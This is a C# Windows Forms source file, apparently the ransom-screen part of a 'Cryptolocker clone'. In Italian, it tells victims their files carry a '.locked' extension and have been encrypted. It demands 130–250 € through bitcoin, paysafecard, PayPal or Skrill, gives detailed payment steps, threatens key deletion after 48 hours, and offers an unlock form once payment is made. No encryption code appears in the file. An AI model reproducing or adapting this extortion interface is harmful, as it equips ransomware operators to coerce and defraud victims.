using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Cryptolocker_5._1_clone
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            RichTextBoxStart();
            datascadenza_label.Text = DateTime.Now.AddDays(2.0).ToString("dd-MM-yyyy - HH:mm ");
        }

        private void RichTextBoxStart()
        {
            richTextBox1.SelectionFont = new Font("Arial", 15f);
            richTextBox1.SelectionColor = Color.Red;
            richTextBox1.SelectedText = "Cos'è Cryptolocker ?\n";
            richTextBox1.SelectedText = "\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "Cryptolocker è un malware appartenente alla famiglia dei ransomware.\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "Questo virus è in grado di criptare con algoritmi asimmetrici i file della vittima.\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "Wikipedia : https://it.wikipedia.org/wiki/CryptoLocker \n";
            richTextBox1.SelectedText = "\n";
            richTextBox1.SelectionFont = new Font("Arial", 15f);
            richTextBox1.SelectionColor = Color.Red;
            richTextBox1.SelectedText = "Come faccio a ripristinare i miei documenti ?\n";
            richTextBox1.SelectedText = "\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "I tuoi documenti,foto,dati e altri file importanti (compresi usb,hard disk,percorsi di rete etc..) sono stati criptati con un algoritmo asimmetrico a due chiavi,pubblica e privata.\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "Tutti i file sopra citati che hanno l'estensione";
            richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
            richTextBox1.SelectedText = " .locked";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = " sono stati bloccati,\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "per sbloccarli hai bisogno della chiave privata.\n";
            richTextBox1.SelectedText = "\n";
            richTextBox1.SelectionFont = new Font("Arial", 15f);
            richTextBox1.SelectionColor = Color.Red;
            richTextBox1.SelectedText = "Come ottengo la chiave privata ?\n";
            richTextBox1.SelectedText = "\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "Mentre la chiave pubblica è stata salvata in una directory di sistema del tuo computer,\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "quella privata è stata inviata sul nostro server,per ottenerla devi pagare la cifra di";
            richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
            richTextBox1.SelectedText = " 130 €\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "Appena l'importo sarà accreditato tramite meteodo di pagamento bitcoin riceverai tramite mail la chiave privata e potrai così riavere accesso ai tuoi dati.\n";
            richTextBox1.SelectedText = "\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Underline);
            richTextBox1.SelectedText = "In caso contrario al termine delle 48h previste per il pagamento del riscatto la chiave privata verrà eliminata e non sarà più possibile recuperare i file.\n";
            richTextBox1.SelectedText = "\n";
            richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
            richTextBox1.SelectedText = "ATTENZIONE : ";
            richTextBox1.SelectionFont = new Font("Arial", 10f);
            richTextBox1.SelectedText = "La rimozione di Cryptolocker non ripristina l'accesso ai file cittografati.";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex == -1)
            {
                MessageBox.Show("Devi selezionare un metodo di pagamento valido.", "Seleziona metodo di pagamento :", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                comboBox1.DroppedDown = true;
                return;
            }
            if (comboBox1.SelectedIndex == 4)
            {
                MessageBox.Show("Il metodo di pagamento selezionato non è attualmente disponibile, riprovare più tardi o selezionare un metodo alternativo.", "Pagamento con Carta di credito :", MessageBoxButtons.OK, MessageBoxIcon.Hand, MessageBoxDefaultButton.Button1);
                button2.PerformClick();
                return;
            }
            if (comboBox1.SelectedIndex == 1)
            {
                richTextBox1.Clear();
                button2.Enabled = true;
                paysafecard_banner.Visible = true;
                paysafecard_biglietto.Visible = true;
                paypal_banner.Visible = false;
                paypal_carte.Visible = false;
                bitcon_banner.Visible = false;
                skrill_banner.Visible = false;
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Complimenti per aver scelto paysafecard come metodo di pagamento !\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Paysafecard è leader di mercato a livello mondiale per i metodi di pagamento prepagati online.\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Per decriptare i file";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = " .locked";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = " devi pagare la cifra di";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = " 250 €\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Acquista uno o più codici pin paysafecard per coprire l'importo da pagare.\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "[+] Come ottengo il codice pin ?\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "1.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Recandoti in un qualsiasi punto vendita autorizzato (cartolerie,tabachi,esselunga etc...)\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "   https://www.paysafecard.com/it-it/acquista\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "   https://www.sisalpay.it/servizi/pagamenti/altri/paysafe\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "2.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Online tramite il circuito EPIN\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "   https://epin.paysafecard.com/pinshop\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "[+] Quale procedura devo seguire ?\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "●";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = " Acquista uno o più pin (16 cifre)\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "●";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = " Verficarne il credito sul sito paysafecard.com\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "●";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = " Ricordari di specificare il tuo UserID\n";
            }
            if (comboBox1.SelectedIndex == 2)
            {
                MessageBox.Show("Attualmente accettiamo pagamenti di tipo MoneyPak solo da utenti residenti in USA,consigliamo di selezionare un metodo di pagamento alternativo. ", "Pagamento con MoneyPak :", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1);
                button2.PerformClick();
                return;
            }
            if (comboBox1.SelectedIndex == 3)
            {
                richTextBox1.Clear();
                button2.Enabled = true;
                paysafecard_banner.Visible = false;
                paysafecard_biglietto.Visible = false;
                paypal_banner.Visible = true;
                paypal_carte.Visible = true;
                bitcon_banner.Visible = false;
                skrill_banner.Visible = false;
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Complimenti per aver scelto paypal come metodo di pagamento !\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Paypal è il metodo di pagamento più semplice per transazioni online,veloce e sicuro.\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Per decriptare i file";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = " .locked";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = " devi pagare la cifra di";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = " 250 €\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Invia il denaro tramite PayPal all'indirizzo mail riportato in seguito :\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "[+] Istruzioni per il pagamento con PayPal :\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "1.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Crea un account paypal o utilizzane uno già esistente.\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "2.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Deposita l'importo da pagare nel tuo account (bonifico,mastercard,carte prepagate etc...)\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "3.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Recati alla seguente pagina : https://www.paypal.com/it/webapps/mpp/send-money-online\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "3.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Seleziona l'indirizzo mail del destinatario e l'importo da pagare.\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "4.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Invia il denaro selezionando (Acquista beni o servizi)\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "5.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Inserisci come casuale pagamento il tuo UserID di rifermento associato.\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "Per saperne di più su PayPal :";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = " https://it.wikipedia.org/wiki/PayPal";
            }
            if (comboBox1.SelectedIndex == 0)
            {
                richTextBox1.Clear();
                button2.Enabled = true;
                paysafecard_banner.Visible = false;
                paysafecard_biglietto.Visible = false;
                paypal_banner.Visible = false;
                paypal_carte.Visible = false;
                bitcon_banner.Visible = true;
                skrill_banner.Visible = false;
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Per decriptare i file";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = " .locked";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = " devi pagare la cifra di";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = " 130 €\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Acquista e trasferisci il denaro all'indirizzo bitcoin riportato in seguito :\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "[+] Come posso acquistare bitcoin ?\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Puoi acquistare bitcoin dal seguente sito web : \n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "https://www.posteb.it\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "1.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Collegati al sito e ignora l'avviso relativo a cryptolocker.\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "2.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Leggi attentamente le istruzioni,in seguito clicca su 'successivo'.\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "3.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Inserisci l'importo di bitcoin da comprare in base al cambio (attualmente circa 0.2395)\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "4.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Segui le istruzioni riportate nel sito ed invia i bitcoin al nostro indirizzo.\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "5.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Contattaci per mail specificando il tuo User ID e ti invieremo la password da inserire nel modulo successivo per sbloccare i tuoi file (rispondiamo in 24/48 massimo).\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "Se avete problemi con la compravendita di bitcoin conttattateci alla mail sottostante,saremo felice di aiutarvi.";
            }
            if (comboBox1.SelectedIndex == 5)
            {
                richTextBox1.Clear();
                button2.Enabled = true;
                paysafecard_banner.Visible = false;
                paysafecard_biglietto.Visible = false;
                paypal_banner.Visible = false;
                paypal_carte.Visible = false;
                bitcon_banner.Visible = false;
                skrill_banner.Visible = true;
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Complimenti per aver scelto skrill come metodo di pagamento !\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Skrill è una società che offre servizi di trasferimento denaro online con base nel Regno Unito.\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Per decriptare i file";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = " .locked";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = " devi pagare la cifra di";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = " 250 €\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Invia il denaro tramite Skrill all'indirizzo mail riportato in seguito :\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "[+] Come invio il denaro tramite Skrill ?\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "1.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Collegati al sito : https://www.skrill.com/it/\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "2.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Crea un contro gratuito : https://account.skrill.com/signup/page1?locale=it\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "3.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Aggiungi fondi al contro ed invia il denaro all'indirizzo mail riportato sopra.\n";
                richTextBox1.SelectedText = "\n";
                richTextBox1.SelectionFont = new Font("Arial", 10f, FontStyle.Bold);
                richTextBox1.SelectedText = "4.";
                richTextBox1.SelectionFont = new Font("Arial", 10f);
                richTextBox1.SelectedText = "Contattaci al nostro indirizzo mail specificando il tuo UserID associato.\n";
            }

            if (button1.Text == "Sblocca i file")
            {
                if (!(Application.OpenForms["Form3"] is Form3))
                {
                    DialogResult dialogResult = MessageBox.Show("Hai effettuato il pagamento ?", "Sblocca i file criptati :", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1);
                    if (dialogResult == DialogResult.Yes && !(Application.OpenForms["Form3"] is Form3))
                    {
                        Form3 form = new Form3();
                        form.Show();
                    }
                    if (dialogResult != DialogResult.No)
                    {
                    }
                }
            }
            else if (comboBox1.SelectedIndex != -1)
            {
                button1.Text = "Sblocca i file";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Application.OpenForms["Form3"]?.Close();
            if (comboBox1.SelectedIndex == 4)
            {
                comboBox1.SelectedIndex = -1;
                button1.Text = "Procedi con il pagamento >>";
                comboBox1.Text = "Seleziona metodo di pagamento";
                richTextBox1.Clear();
                richTextBox1.Refresh();
                paysafecard_banner.Visible = false;
                paysafecard_biglietto.Visible = false;
                paypal_banner.Visible = false;
                paypal_carte.Visible = false;
                bitcon_banner.Visible = false;
                skrill_banner.Visible = false;
                RichTextBoxStart();
            }
            if (comboBox1.SelectedIndex == 1)
            {
                DialogResult dialogResult = MessageBox.Show("Sei sicuro di voler tornare indietro ?", "Hai scelto PaySafecard come metodo di pagamento :", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                if (dialogResult == DialogResult.Yes)
                {
                    comboBox1.SelectedIndex = -1;
                    button1.Text = "Procedi con il pagamento >>";
                    comboBox1.Text = "Seleziona metodo di pagamento";
                    richTextBox1.Clear();
                    richTextBox1.Refresh();
                    button2.Enabled = false;
                    paysafecard_banner.Visible = false;
                    paysafecard_biglietto.Visible = false;
                    paypal_banner.Visible = false;
                    paypal_carte.Visible = false;
                    bitcon_banner.Visible = false;
                    skrill_banner.Visible = false;
                    RichTextBoxStart();
                }
                if (dialogResult != DialogResult.No)
                {
                }
            }
            if (comboBox1.SelectedIndex == 2)
            {
                comboBox1.SelectedIndex = -1;
                button1.Text = "Procedi con il pagamento >>";
                comboBox1.Text = "Seleziona metodo di pagamento";
                richTextBox1.Clear();
                richTextBox1.Refresh();
                paysafecard_banner.Visible = false;
                paysafecard_biglietto.Visible = false;
                paypal_banner.Visible = false;
                paypal_carte.Visible = false;
                bitcon_banner.Visible = false;
                skrill_banner.Visible = false;
                RichTextBoxStart();
            }
            if (comboBox1.SelectedIndex == 3)
            {
                DialogResult dialogResult2 = MessageBox.Show("Sei sicuro di voler tornare indietro ?", "Hai scelto PayPal come metodo di pagamento :", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                if (dialogResult2 == DialogResult.Yes)
                {
                    comboBox1.SelectedIndex = -1;
                    button1.Text = "Procedi con il pagamento >>";
                    comboBox1.Text = "Seleziona metodo di pagamento";
                    richTextBox1.Clear();
                    richTextBox1.Refresh();
                    button2.Enabled = false;
                    paysafecard_banner.Visible = false;
                    paysafecard_biglietto.Visible = false;
                    paypal_banner.Visible = false;
                    paypal_carte.Visible = false;
                    bitcon_banner.Visible = false;
                    skrill_banner.Visible = false;
                    RichTextBoxStart();
                }
                if (dialogResult2 != DialogResult.No)
                {
                }
            }
            if (comboBox1.SelectedIndex == 0)
            {
                DialogResult dialogResult3 = MessageBox.Show("Sei sicuro di voler tornare indietro ?", "Hai scelto Bitcoin come metodo di pagamento :", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                if (dialogResult3 == DialogResult.Yes)
                {
                    comboBox1.SelectedIndex = -1;
                    button1.Text = "Procedi con il pagamento >>";
                    comboBox1.Text = "Seleziona metodo di pagamento";
                    richTextBox1.Clear();
                    richTextBox1.Refresh();
                    button2.Enabled = false;
                    paysafecard_banner.Visible = false;
                    paysafecard_biglietto.Visible = false;
                    paypal_banner.Visible = false;
                    paypal_carte.Visible = false;
                    bitcon_banner.Visible = false;
                    skrill_banner.Visible = false;
                    RichTextBoxStart();
                }
                if (dialogResult3 != DialogResult.No)
                {
                }
            }
            if (comboBox1.SelectedIndex == 5)
            {
                DialogResult dialogResult4 = MessageBox.Show("Sei sicuro di voler tornare indietro ?", "Hai scelto Skrill come metodo di pagamento :", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                if (dialogResult4 == DialogResult.Yes)
                {
                    comboBox1.SelectedIndex = -1;
                    button1.Text = "Procedi con il pagamento >>";
                    comboBox1.Text = "Seleziona metodo di pagamento";
                    richTextBox1.Clear();
                    richTextBox1.Refresh();
                    button2.Enabled = false;
                    paysafecard_banner.Visible = false;
                    paysafecard_biglietto.Visible = false;
                    paypal_banner.Visible = false;
                    paypal_carte.Visible = false;
                    bitcon_banner.Visible = false;
                    skrill_banner.Visible = false;
                    RichTextBoxStart();
                }
                if (dialogResult4 != DialogResult.No)
                {
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (!(Application.OpenForms["Form2"] is Form2))
            {
                Form2 form = new Form2();
                form.Show();
            }
        }
    }
}
